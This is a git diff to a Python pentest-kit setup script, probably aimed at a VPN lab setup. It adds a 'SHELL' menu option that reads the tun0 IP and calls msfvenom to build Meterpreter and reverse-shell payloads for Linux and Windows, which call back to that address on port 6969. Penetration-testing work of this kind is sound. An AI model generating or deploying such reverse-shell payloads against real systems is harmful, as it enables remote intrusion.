@@ -29,6 +29,9 @@ pypi_packages = ['one-lin3r','ptftpd','bloodhound']
 
 sublime = 'deb https://download.sublimetext.com/ apt/stable/'
 user = os.getlogin()
+ip_addr = os.popen('ip addr show tun0 | grep "\\<inet\\>" | awk \'{ print $2 }\' | awk -F "/" \'{ print $1 }\'').read().strip()
+listen_port = 6969
+
 
 def system_update():
     #os.system(f"cd /opt/")
@@ -173,10 +176,26 @@ def tool_init():
     os.system('sudo msfdb init')
 
 
+
+### DEVELOPMENT AREA ####
+
+def shell_creation():
+    print(f"Interface address is: {ip_addr}")
+    print(f"Port being used for shells is {listen_port}")
+    print("                           Nice")
+    #os.system(f'msfvenom -p linux/x64/shell_reverse_tcp RHOST={ip_addr} LPORT={listen_port} -f elf > /tmp/test.elf')
+    os.system(f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip_addr} LPORT={listen_port} -f elf > /tmp/test.elf')
+    #os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip_addr} LPORT={listen_port} -f exe > /tmp/test.exe')
+    print("Did I work? doubtful!")
+
+#### END DEVELOPMENT AREA ####
+
+
+
 def main():
     print(colored("Automated Kit buildout script\n", 'blue'))
     print("Would you like to install ALL or just the TOOLS?\n")
-    print("Please type TOOLS or ALL \n")
+    print("Please type TOOLS, SHELL or ALL \n")
     choice = input()
     choice = str(choice)
     if choice == "ALL":
@@ -184,6 +203,8 @@ def main():
         software_update()
     elif choice == "TOOLS":
         software_update()
+    elif choice == "SHELL":
+        shell_creation()
     else:
         print("You had one simple choice and you already screwed that up")
 
